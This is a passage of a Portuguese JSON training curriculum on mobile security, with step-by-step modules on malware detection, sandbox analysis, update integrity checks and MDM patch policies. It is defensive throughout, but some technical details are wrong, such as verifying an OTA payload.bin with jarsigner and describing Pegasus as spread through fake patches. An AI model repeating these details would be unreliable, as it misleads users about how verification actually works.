                                "Análise Reversa (Ghidra/IDA para assembly).",
                                "Desenvolvimento Móvel (JNI e native code em Android).",
                                "Programação em Linguagens Baixas (C/Assembly ARM).",
                                "Redes e Protocolos (intents como vetores de injeção).",
                                "Ética em Cibersegurança (relatórios de CVEs)."
                              ],
                              "realWorldApplication": "Auditar apps bancários ou corporativos móveis para prevenir ROP exploits em atualizações OTA, integrando em pipelines CI/CD de segurança para detecção precoce em equipes de Red Team/Blue Team."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.5.2",
                        "name": "Detecção de Ameaças e Malware",
                        "description": "Métodos para identificar e mitigar malware em dispositivos móveis, incluindo detecção baseada em assinaturas, heurística e análise comportamental.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.2.1",
                            "name": "Implementar Detecção Baseada em Assinaturas",
                            "description": "Usar bancos de dados de hashes e padrões conhecidos de malware para escanear apps e arquivos em dispositivos Android e iOS com ferramentas como VirusTotal ou antivírus móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Detecção Baseada em Assinaturas",
                                  "subSteps": [
                                    "Estude o conceito de hashes (MD5, SHA-256) e como eles representam assinaturas únicas de malware.",
                                    "Analise exemplos de bancos de dados como VirusTotal, que comparam hashes com padrões conhecidos.",
                                    "Diferencie detecção por assinaturas de heurística ou aprendizado de máquina.",
                                    "Revise limitações, como evasão por ofuscação ou polimorfismo.",
                                    "Explore atualizações de assinaturas em antivírus móveis."
                                  ],
                                  "verification": "Resuma em um documento os conceitos chave e forneça 3 exemplos de hashes de malware conhecidos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação VirusTotal, artigos sobre hashes (Kaspersky, Malwarebytes), notebook para anotações.",
                                  "tips": "Use diagramas para visualizar o fluxo: arquivo → hash → comparação com DB.",
                                  "learningObjective": "Dominar como assinaturas funcionam para detecção estática de malware.",
                                  "commonMistakes": "Confundir hashes com padrões de strings; ignorar que hashes mudam com modificações mínimas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ferramentas de Detecção para Android e iOS",
                                  "subSteps": [
                                    "Instale VirusTotal app ou uploader no computador e crie conta gratuita.",
                                    "Baixe antivírus móveis como Avast ou Malwarebytes para Android/iOS via lojas oficiais.",
                                    "Configure contas e ative scans automáticos de apps/downloads.",
                                    "Integre API básica do VirusTotal para scans programáticos (opcional).",
                                    "Teste configuração com arquivo benigno conhecido."
                                  ],
                                  "verification": "Execute um scan de teste em um app oficial (ex: Google Maps) e confirme resultado limpo.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Dispositivos Android/iOS, PC com navegador, contas VirusTotal/Avast.",
                                  "tips": "Habilite notificações para scans em tempo real em dispositivos móveis.",
                                  "learningObjective": "Preparar ambiente para scans eficientes em plataformas móveis.",
                                  "commonMistakes": "Baixar APKs de fontes não oficiais; esquecer permissões de armazenamento."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Realizar Scans de Arquivos e Apps em Dispositivos Móveis",
                                  "subSteps": [
                                    "Selecione arquivos suspeitos (APKs, IPAs, downloads recentes).",
                                    "Carregue para VirusTotal via web/app e aguarde análise multi-motor.",
                                    "Execute scan local com antivírus móvel em apps instalados.",
                                    "Compare resultados entre ferramentas para consenso.",
                                    "Registre hashes e detecções em um log pessoal."
                                  ],
                                  "verification": "Gere relatório de scan para 3 arquivos diferentes, com pelo menos um positivo simulado.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Arquivos de teste (EICAR test file, APKs sample do VirusTotal), apps antivírus.",
                                  "tips": "Use VirusTotal Intelligence para contexto adicional sobre hashes.",
                                  "learningObjective": "Executar detecção prática identificando ameaças via assinaturas.",
                                  "commonMistakes": "Interpretar falsos positivos sem verificação cruzada; scans incompletos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados, Verificar e Manter Atualizações",
                                  "subSteps": [
                                    "Interprete relatórios: detecções, engines concordantes, scores de risco.",
                                    "Verifique falsos positivos consultando fontes oficiais.",
                                    "Configure atualizações automáticas de assinaturas nos antivírus.",
                                    "Crie rotina semanal de scans e monitoramento.",
                                    "Documente lições aprendidas e melhore processos."
                                  ],
                                  "verification": "Crie um relatório final com análise de 2 scans e plano de manutenção.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Relatórios de scans anteriores, calendário para rotinas.",
                                  "tips": "Priorize engines com alta taxa de detecção como ESET ou Bitdefender.",
                                  "learningObjective": "Garantir precisão e continuidade na detecção de malware.",
                                  "commonMistakes": "Ignorar atualizações; confiar cegamente em uma única ferramenta."
                                }
                              ],
                              "practicalExample": "Baixe um APK suspeito de um site não confiável em um emulador Android. Carregue no VirusTotal: se o hash coincidir com known malware como 'FakeApp.Trojan', quarentena o arquivo e desinstale. No iOS, escaneie um perfil de configuração suspeito via antivírus móvel, confirmando detecção de adware.",
                              "finalVerifications": [
                                "Scans executados com sucesso em pelo menos 5 arquivos/apps sem erros.",
                                "Hashes corretamente gerados e comparados com DBs públicos.",
                                "Atualizações de assinaturas configuradas e testadas.",
                                "Relatório de análise sem falsos positivos não investigados.",
                                "Rotina de manutenção documentada e agendada.",
                                "Conhecimento demonstrado em quiz sobre limitações de assinaturas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de resultados (90%+ acurácia).",
                                "Cobertura completa de Android e iOS.",
                                "Tempo de scan otimizado (<5min por arquivo médio).",
                                "Uso correto de múltiplas ferramentas para validação.",
                                "Documentação clara e acionável.",
                                "Identificação proativa de erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Geração de hashes via Python (hashlib).",
                                "Redes: Análise de tráfego para detecção comportamental complementar.",
                                "Ética em TI: Privacidade em scans de dados pessoais.",
                                "Matemática: Conceitos criptográficos de funções hash."
                              ],
                              "realWorldApplication": "Em empresas de TI móvel, implemente para proteger frotas de dispositivos corporativos, escaneando apps de funcionários e atualizando assinaturas diariamente para prevenir infecções como ransomware em apps de banking falsos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.2.2",
                            "name": "Aplicar Detecção Heurística e Comportamental",
                            "description": "Analisar padrões de execução suspeitos, como tráfego de rede anômalo ou criptografia de dados, para detectar malware zero-day em tempo real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Detecção Heurística e Comportamental",
                                  "subSteps": [
                                    "Estudar definições: heurística baseia-se em regras empíricas para padrões anômalos; comportamental monitora ações em runtime.",
                                    "Analisar diferenças com detecção assinatura-based: heurística/comportamental foca em zero-day.",
                                    "Revisar exemplos: tráfego de rede incomum, criptografia massiva de arquivos, injeções de código.",
                                    "Mapear heurísticas comuns: entropia de arquivos, chamadas API suspeitas, persistência anormal.",
                                    "Explorar baselines normais vs. anomalias em dispositivos móveis."
                                  ],
                                  "verification": "Resumir em um diagrama comparativo heurística vs. comportamental e listar 5 heurísticas chave.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação de ferramentas como Zeek ou Suricata",
                                    "Artigos sobre detecção de malware zero-day",
                                    "Vídeos tutoriais sobre análise comportamental"
                                  ],
                                  "tips": "Use analogias cotidianas, como detectar mentiras por padrões de fala, para fixar conceitos.",
                                  "learningObjective": "Diferenciar e exemplificar detecção heurística e comportamental aplicada a malware.",
                                  "commonMistakes": "Confundir com detecção baseada em assinaturas; ignorar contexto móvel como bateria e GPS."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Monitoramento em Dispositivos Móveis",
                                  "subSteps": [
                                    "Instalar ferramentas: Wireshark para rede, Frida para análise dinâmica, ou MobSF para sandbox móvel.",
                                    "Configurar baselines: monitorar tráfego normal de apps legítimos por 30min.",
                                    "Habilitar logs: syslogs, netflow, hooks em APIs como crypto e network.",
                                    "Simular ambiente controlado: emulador Android/iOS com VPN para captura de pacotes.",
                                    "Testar configuração: injetar tráfego benigno e verificar detecção."
                                  ],
                                  "verification": "Gerar relatório de baseline com métricas normais (ex: bytes/s, conexões/min).",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Emulador Android Studio ou Genymotion",
                                    "Wireshark ou tcpdump",
                                    "Frida toolkit",
                                    "Dispositivo móvel rootado/jailbroken opcional"
                                  ],
                                  "tips": "Comece com emulador para evitar riscos em dispositivos reais.",
                                  "learningObjective": "Preparar infraestrutura para monitoramento em tempo real de padrões suspeitos.",
                                  "commonMistakes": "Não calibrar baselines, levando a falsos positivos; esquecer permissões em apps móveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Analisar Padrões Suspeitos de Execução",
                                  "subSteps": [
                                    "Capturar dados: monitorar rede (ex: C2 incomum), CPU/memória spikes, criptografia AES suspeita.",
                                    "Aplicar heurísticas: calcular entropia >7.5 para arquivos criptografados; detectar loops de rede.",
                                    "Analisar comportamento: rastrear chamadas como sendBeacon() ou execve() anormais.",
                                    "Pontuar anomalias: criar score (ex: +20 por tráfego TOR, +30 por packing).",
                                    "Correlacionar eventos: sequências como download + unpack + persistência."
                                  ],
                                  "verification": "Analisar sample de malware e listar 3 anomalias detectadas com evidências.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Samples de malware EICAR ou VirusShare (em sandbox)",
                                    "Scripts Python para análise heurística",
                                    "Ferramentas como Volatility para memória"
                                  ],
                                  "tips": "Use thresholds ajustáveis baseados em baselines para reduzir ruído.",
                                  "learningObjective": "Reconhecer e quantificar padrões heurísticos/comportamentais de zero-day.",
                                  "commonMistakes": "Sobrecarregar com alertas irrelevantes; ignorar ruído de apps legítimos como VPNs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Detecção em Tempo Real e Responder",
                                  "subSteps": [
                                    "Criar regras em tempo real: scripts com YARA para heurística ou Sigma para comportamental.",
                                    "Automatizar alertas: integrar com SIEM como ELK para notificações instantâneas.",
                                    "Simular resposta: quarentena app, dump memória, análise forense.",
                                    "Validar eficácia: testar com 5 samples zero-day simulados.",
                                    "Documentar playbook: passos para triage e escalonamento."
                                  ],
                                  "verification": "Executar detecção end-to-end e gerar alerta com score >80.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "ELK Stack ou Splunk free",
                                    "YARA rules repo",
                                    "Scripts de automação em Bash/Python"
                                  ],
                                  "tips": "Priorize detecção passiva primeiro para evitar evasão ativa.",
                                  "learningObjective": "Desenvolver fluxo completo de detecção e mitigação em runtime.",
                                  "commonMistakes": "Regras muito rígidas causando falsos negativos; não testar com evasões."
                                }
                              ],
                              "practicalExample": "Em um emulador Android, monitore um app malicioso que baixa payload via HTTP, criptografa fotos e envia para C2. Detecte anomalia: spike de CPU + tráfego para IP TOR + entropia alta, isolando o app em <1min.",
                              "finalVerifications": [
                                "Detectar 80% de samples zero-day simulados sem falsos negativos.",
                                "Gerar alertas com evidências (logs, capturas) em <30s.",
                                "Diferenciar corretamente 5 padrões heurísticos de benignos.",
                                "Implementar resposta automatizada para quarentena.",
                                "Documentar análise com scores e correlações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de anomalias (threshold 85%).",
                                "Eficiência temporal: detecção em tempo real (<60s).",
                                "Qualidade de configuração: baselines sem vazamentos.",
                                "Criatividade em heurísticas personalizadas.",
                                "Documentação clara e acionável do processo.",
                                "Capacidade de correlação multi-evento."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de tráfego com Wireshark (SC-07 Redes).",
                                "Programação: Scripts Python para automação heurística (PR-02 Coding).",
                                "Análise de Dados: Machine Learning básico para baselines (DA-03 Estatística).",
                                "Ética: Privacidade em monitoramento móvel (ET-01 Compliance)."
                              ],
                              "realWorldApplication": "Em equipes SOC de empresas como bancos ou telecoms, detectar ransomware móvel zero-day em frotas de dispositivos corporativos, prevenindo vazamentos de dados e downtime."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.2.3",
                            "name": "Utilizar Sandboxing para Análise de Malware",
                            "description": "Executar apps suspeitos em ambientes isolados virtuais para observar interações maliciosas sem comprometer o dispositivo principal.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Sandbox Isolado",
                                  "subSteps": [
                                    "Escolha uma ferramenta de sandbox como Cuckoo Sandbox, Sandboxie ou uma VM com VirtualBox/VMware.",
                                    "Instale e configure a VM com SO isolado (ex: Windows 10 snapshot limpo ou emulador Android).",
                                    "Configure rede isolada (host-only ou NAT restrito) para evitar vazamento.",
                                    "Instale ferramentas de monitoramento: Process Explorer, Wireshark, RegShot.",
                                    "Crie snapshots iniciais para reset rápido."
                                  ],
                                  "verification": "Verifique se a VM inicia sem conexão com a rede externa e snapshot é criado com sucesso.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "ISO de SO limpo",
                                    "Ferramentas: Wireshark, Process Explorer, RegShot"
                                  ],
                                  "tips": "Use snapshots para reverter mudanças; desative compartilhamento de pastas.",
                                  "learningObjective": "Entender e implementar isolamento completo para análise segura.",
                                  "commonMistakes": [
                                    "Conectar VM à internet real",
                                    "Esquecer de criar snapshot inicial",
                                    "Compartilhar pastas com host"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adquirir e Preparar Amostra de Malware Suspeita",
                                  "subSteps": [
                                    "Obtenha amostra de fontes seguras como VirusTotal ou MalwareBazaar (use hash para download).",
                                    "Transfira arquivo para sandbox via USB virtual ou drag-and-drop seguro.",
                                    "Escaneie amostra com múltiplos AVs antes de executar para baseline.",
                                    "Documente metadados: hash MD5/SHA256, tamanho, tipo de arquivo.",
                                    "Coloque em pasta monitorada dentro da VM."
                                  ],
                                  "verification": "Confirme hash da amostra e que ela está isolada na VM sem execução.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VirusTotal/MalwareBazaar",
                                    "HashCalc ou PowerShell para hashes"
                                  ],
                                  "tips": "Nunca execute amostra no host; use container Docker se preferir para amostras leves.",
                                  "learningObjective": "Manipular amostras maliciosas com segurança e documentação precisa.",
                                  "commonMistakes": [
                                    "Executar amostra no host",
                                    "Baixar de fontes não confiáveis",
                                    "Ignorar hashes para verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar e Monitorar Comportamentos na Sandbox",
                                  "subSteps": [
                                    "Inicie monitoramento: abra Wireshark, Process Explorer e RegShot pré-execução.",
                                    "Execute a amostra (double-click ou via linha de comando).",
                                    "Observe em tempo real: processos filhos, conexões de rede, mudanças de registry/arquivos.",
                                    "Registre timestamps de eventos suspeitos.",
                                    "Deixe rodar por 5-10 minutos ou até estabilizar."
                                  ],
                                  "verification": "Capture logs de rede, processos e diffs de filesystem/registry.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Process Explorer",
                                    "RegShot",
                                    "Autoruns"
                                  ],
                                  "tips": "Use detecção de evasão: desative AV na VM; simule interações usuário.",
                                  "learningObjective": "Monitorar dinamicamente interações maliciosas em ambiente controlado.",
                                  "commonMistakes": [
                                    "Não capturar baseline pré-execução",
                                    "Ignorar tráfego de rede",
                                    "Parar monitoramento cedo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados e Gerar Relatório",
                                  "subSteps": [
                                    "Compare diffs: RegShot para mudanças, Wireshark para C2 traffic.",
                                    "Identifique IOCs: IPs suspeitos, mutexes, persistência (run keys).",
                                    "Classifique malware: ransomware, trojan, etc., baseado em behaviors.",
                                    "Reverta snapshot e teste variações se necessário.",
                                    "Compile relatório com screenshots, logs e recomendações."
                                  ],
                                  "verification": "Relatório completo com IOCs identificados e evidências.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "RegShot diffs",
                                    "Wireshark pcap",
                                    "Template de relatório IOC"
                                  ],
                                  "tips": "Priorize IOCs acionáveis como hashes e IPs para YARA/sigma rules.",
                                  "learningObjective": "Interpretar dados de sandbox para threat intelligence.",
                                  "commonMistakes": [
                                    "Não correlacionar eventos",
                                    "Esquecer screenshots",
                                    "Classificação superficial"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar Limpeza e Boas Práticas",
                                  "subSteps": [
                                    "Reverta VM ao snapshot inicial e confirme limpeza.",
                                    "Analise logs do host por vazamentos.",
                                    "Atualize regras de firewall/IDS baseadas em IOCs.",
                                    "Armazene amostra em repositório seguro (hash-based).",
                                    "Teste sandbox com amostra benigna para validar."
                                  ],
                                  "verification": "VM limpa, sem persistência, e teste benigno passa sem falsos positivos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Snapshot manager",
                                    "Teste EICAR benigno"
                                  ],
                                  "tips": "Automatize com scripts para relatórios recorrentes.",
                                  "learningObjective": "Garantir segurança pós-análise e lições aprendidas.",
                                  "commonMistakes": [
                                    "Não reverter snapshot",
                                    "Deixar IOCs no host",
                                    "Ignorar falsos positivos"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe um APK suspeito do VirusTotal, execute em emulador Android no VirtualBox com Wireshark capturando tráfego. Observe roubo de SMS e conexão C2 para um IP chinês, identifique como spyware bancário.",
                              "finalVerifications": [
                                "Sandbox manteve isolamento total (sem vazamento para host/rede).",
                                "Todos IOCs (hashes, IPs, mutexes) documentados corretamente.",
                                "Comportamentos maliciosos identificados com evidências (screenshots/logs).",
                                "VM revertida ao estado limpo.",
                                "Relatório gerado com classificações e recomendações.",
                                "Teste de controle com arquivo benigno não gera alertas falsos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de isolamento (rede, snapshots).",
                                "Completude do monitoramento (rede, processos, filesystem).",
                                "Qualidade da análise de IOCs e classificação de malware.",
                                "Segurança na manipulação da amostra.",
                                "Clareza e completude do relatório final.",
                                "Eficiência temporal dentro das estimativas."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de tráfego com Wireshark (protocolos TCP/UDP).",
                                "Programação: Scripts Python para automação de sandboxes (Cuckoo API).",
                                "Sistemas Operacionais: Gerenciamento de VMs e registry Windows/Android.",
                                "Ética e Direito: Conformidade com leis de manuseio de malware.",
                                "Data Science: Análise de logs para padrões de ameaças."
                              ],
                              "realWorldApplication": "Analistas de SOC usam sandboxing para triagem diária de malwares em incidentes, gerando IOCs para bloqueio em firewalls empresariais e alertas para equipes de threat hunting."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.5.3",
                        "name": "Gerenciamento de Patches e Atualizações",
                        "description": "Estratégias para manter dispositivos móveis seguros através de verificação de integridade, aplicação de patches e automação de atualizações.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.3.1",
                            "name": "Verificar Integridade de Atualizações",
                            "description": "Usar funções hash e assinaturas digitais para validar a autenticidade e integridade de patches de segurança antes da instalação em dispositivos móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Hash e Assinaturas Digitais",
                                  "subSteps": [
                                    "Estude o conceito de funções hash (ex: SHA-256) como impressão digital única de arquivos.",
                                    "Aprenda como assinaturas digitais usam chaves públicas/privadas para autenticação.",
                                    "Diferencie integridade (hash) de autenticidade (assinatura).",
                                    "Revise ataques comuns como man-in-the-middle em downloads.",
                                    "Pratique gerando um hash simples com ferramenta online ou terminal."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre hash e assinatura digital com exemplos.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação oficial SHA-256 (NIST)",
                                    "Ferramenta de terminal (sha256sum no Linux ou PowerShell no Windows)",
                                    "Vídeo tutorial curto sobre criptografia assimétrica"
                                  ],
                                  "tips": "Use analogias: hash é como peso de um pacote; assinatura é selo oficial.",
                                  "learningObjective": "Dominar conceitos teóricos de hash e assinaturas para validação de integridade.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia simétrica",
                                    "Ignorar colisões de hash raras mas possíveis",
                                    "Não entender que hash não prova origem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Obter Patches Oficiais com Metadados",
                                  "subSteps": [
                                    "Acesse repositórios oficiais de patches (ex: Google para Android, Apple para iOS).",
                                    "Localize metadados: hash fornecido (SHA-256) e certificado de assinatura.",
                                    "Baixe o patch em ambiente isolado (VM ou sandbox).",
                                    "Verifique o canal de download (HTTPS, checksums prévios).",
                                    "Salve metadados em arquivo separado para referência."
                                  ],
                                  "verification": "Confirme que possui hash esperado e chave pública do fornecedor documentados.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Navegador web seguro",
                                    "Máquina virtual (VirtualBox)",
                                    "Lista de fontes oficiais de patches móveis"
                                  ],
                                  "tips": "Sempre priorize sites .gov ou oficiais; evite mirrors não verificados.",
                                  "learningObjective": "Saber sourcing seguro de atualizações e extração de metadados.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais",
                                    "Ignorar expiração de certificados",
                                    "Não isolar download"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular Hash Local do Patch Baixado",
                                  "subSteps": [
                                    "Use ferramenta CLI: sha256sum arquivo.patch no Linux ou Get-FileHash no Windows.",
                                    "Compare hash calculado com o hash oficial fornecido.",
                                    "Registre discrepâncias em log.",
                                    "Repita cálculo em amostra aleatória se múltiplos arquivos.",
                                    "Automatize com script simples se possível."
                                  ],
                                  "verification": "Hash calculado bate 100% com o oficial; demonstre no terminal.",
                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Terminal/Command Prompt",
                                    "Patch de exemplo baixado",
                                    "Editor de texto para logs"
                                  ],
                                  "tips": "Case-sensitive: verifique maiúsculas/minúsculas no hash.",
                                  "learningObjective": "Executar verificação de integridade via hash de forma precisa.",
                                  "commonMistakes": [
                                    "Erro de digitação no comando",
                                    "Comparar hashes parciais",
                                    "Usar MD5 em vez de SHA-256"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Assinatura Digital do Patch",
                                  "subSteps": [
                                    "Obtenha chave pública do fornecedor (ex: Google APK keys).",
                                    "Use openssl ou jarsigner para validar assinatura (Android: jarsigner -verify).",
                                    "Para iOS: codesign -dv --verbose=6 arquivo.ipsw.",
                                    "Confirme cadeia de certificados até root CA confiável.",
                                    "Rejeite se assinatura inválida ou revogada."
                                  ],
                                  "verification": "Comando de verificação retorna 'OK' ou 'valid'; capture saída.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "jarsigner (JDK)",
                                    "Chaves públicas oficiais baixadas"
                                  ],
                                  "tips": "Instale ferramentas via package manager: apt install openssl-tools.",
                                  "learningObjective": "Validar autenticidade usando criptografia de chave pública.",
                                  "commonMistakes": [
                                    "Chave pública errada",
                                    "Ignorar warnings de self-signed",
                                    "Não checar data de validade"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar Validação e Proceder à Instalação Condicional",
                                  "subSteps": [
                                    "Compile relatório: hashes iguais? Assinatura válida?",
                                    "Se falhar, reporte e descarte patch.",
                                    "Se passar, instale em dispositivo de teste.",
                                    "Monitore pós-instalação por anomalias.",
                                    "Automatize processo em script para reutilização."
                                  ],
                                  "verification": "Relatório completo gerado e instalação realizada apenas se validado.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Editor de texto ou Markdown para relatório",
                                    "Dispositivo móvel de teste (emulador)",
                                    "Script template bash/PowerShell"
                                  ],
                                  "tips": "Sempre teste em staging antes de produção.",
                                  "learningObjective": "Integrar verificações em workflow seguro de patching.",
                                  "commonMistakes": [
                                    "Instalar apesar de falhas",
                                    "Não documentar para auditoria",
                                    "Pular monitoramento pós"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao atualizar um dispositivo Android com OTA do Google Pixel: Baixe payload.bin de developers.google.com, calcule sha256sum payload.bin e compare com hash oficial; valide assinatura com jarsigner -verify -verbose -certs payload.bin usando chave Google.",
                              "finalVerifications": [
                                "Calcula e compara hash corretamente em <5 minutos.",
                                "Valida assinatura digital sem erros de ferramenta.",
                                "Identifica fontes oficiais de patches.",
                                "Gera relatório completo de validação.",
                                "Explica riscos de pular verificações.",
                                "Aplica em emulador móvel real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na comparação de hashes (100% match).",
                                "Correta interpretação de saídas de ferramentas de assinatura.",
                                "Documentação clara e completa.",
                                "Tempo de execução dentro do estimado.",
                                "Identificação de pelo menos 3 erros comuns evitados.",
                                "Demonstração prática em ambiente móvel."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia (Matemática: funções hash e modularidade).",
                                "Programação (Scripts em Bash/Python para automação).",
                                "Gestão de Sistemas (TI: políticas de patching).",
                                "Ética em TI (Segurança vs. Usabilidade)."
                              ],
                              "realWorldApplication": "Em empresas, previne brechas como o ataque Pegasus, onde patches falsos instalam spyware em frotas de dispositivos móveis corporativos, garantindo conformidade com standards como NIST SP 800-53."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.3.2",
                            "name": "Gerenciar Ciclo de Patches Automatizados",
                            "description": "Configurar políticas de atualização automática em SO móveis como Android e iOS, priorizando patches críticos e monitorando conformidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar Ambiente e Planejar Políticas de Patches",
                                  "subSteps": [
                                    "Inventariar dispositivos móveis (Android e iOS) na frota corporativa.",
                                    "Identificar ferramentas de MDM (Mobile Device Management) disponíveis, como Microsoft Intune ou Jamf Pro.",
                                    "Analisar políticas atuais de atualizações e riscos de vulnerabilidades conhecidas (ex: CVE recentes).",
                                    "Definir critérios de priorização: patches críticos (alta severidade) vs. não-críticos.",
                                    "Documentar plano de ciclo de patches: detecção, teste, deployment e rollback."
                                  ],
                                  "verification": "Relatório de inventário e plano documentado aprovado por stakeholder.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas MDM (Intune, Jamf)",
                                    "Documentação oficial Android Enterprise e Apple VPP",
                                    "Lista de CVEs do NIST NVD"
                                  ],
                                  "tips": "Priorize dispositivos com dados sensíveis; integre com SIEM para alertas de vulnerabilidades.",
                                  "learningObjective": "Compreender o ambiente móvel e criar um plano estratégico para gerenciamento de patches.",
                                  "commonMistakes": [
                                    "Ignorar dispositivos legacy incompatíveis",
                                    "Subestimar tempo de aprovação de políticas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Políticas de Atualizações Automáticas no Android",
                                  "subSteps": [
                                    "Configurar perfil de trabalho Android Enterprise no console de MDM.",
                                    "Habilitar atualizações automáticas via políticas de sistema (System Updates policy).",
                                    "Definir janelas de manutenção para instalações noturnas e pausas para apps críticos.",
                                    "Configurar deferral de atualizações (ex: 7 dias para testes) para patches não-críticos.",
                                    "Testar política em grupo piloto de 10 dispositivos."
                                  ],
                                  "verification": "Logs do MDM mostram políticas aplicadas e atualizações deferidas corretamente em dispositivos piloto.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Console Google Android Enterprise",
                                    "MDM como Intune ou Workspace ONE",
                                    "Dispositivos Android de teste"
                                  ],
                                  "tips": "Use 'High Priority' para patches de segurança; monitore bateria durante instalações.",
                                  "learningObjective": "Implementar automação de patches específicos para ecossistema Android.",
                                  "commonMistakes": [
                                    "Não configurar exceções para apps de produção",
                                    "Esquecer autenticação em rede corporativa"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Políticas de Atualizações Automáticas no iOS",
                                  "subSteps": [
                                    "Integrar Apple Business Manager (ABM) ou Device Enrollment Program (DEP) com MDM.",
                                    "Criar configuração de 'Deferred Updates' e 'Automatic Updates' no perfil.",
                                    "Definir delay para atualizações (ex: 30 dias para major, imediato para security).",
                                    "Habilitar 'Install iOS Updates' e 'Enforce Critical Updates' via supervised mode.",
                                    "Aplicar e validar em dispositivos iOS supervisionados."
                                  ],
                                  "verification": "Relatório Jamf/Intune confirma políticas push e conformidade em 100% dos dispositivos iOS.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Apple Business Manager portal",
                                    "MDM Jamf Pro ou Intune",
                                    "iPhones/iPads supervisionados"
                                  ],
                                  "tips": "Use supervised devices para controle total; teste em staging antes de produção.",
                                  "learningObjective": "Dominar configuração segura de atualizações no ecossistema iOS.",
                                  "commonMistakes": [
                                    "Não supervisionar dispositivos",
                                    "Ignorar restrições de bateria em iOS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Priorizar Patches Críticos e Configurar Monitoramento",
                                  "subSteps": [
                                    "Integrar feed de vulnerabilidades (ex: Android Security Bulletin, Apple Security Updates) ao MDM.",
                                    "Criar regras de priorização: CVSS score >7.0 = deployment imediato.",
                                    "Configurar alertas e relatórios automáticos de conformidade no dashboard MDM.",
                                    "Implementar scripts para auditoria (ex: PowerShell para Intune ou API Jamf).",
                                    "Definir procedimentos de rollback para falhas de patch."
                                  ],
                                  "verification": "Dashboard mostra 95% de conformidade e alertas testados com patch simulado.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "APIs de bulletins de segurança Android/Apple",
                                    "Ferramentas de monitoramento como Splunk ou Azure Monitor",
                                    "Scripts de automação"
                                  ],
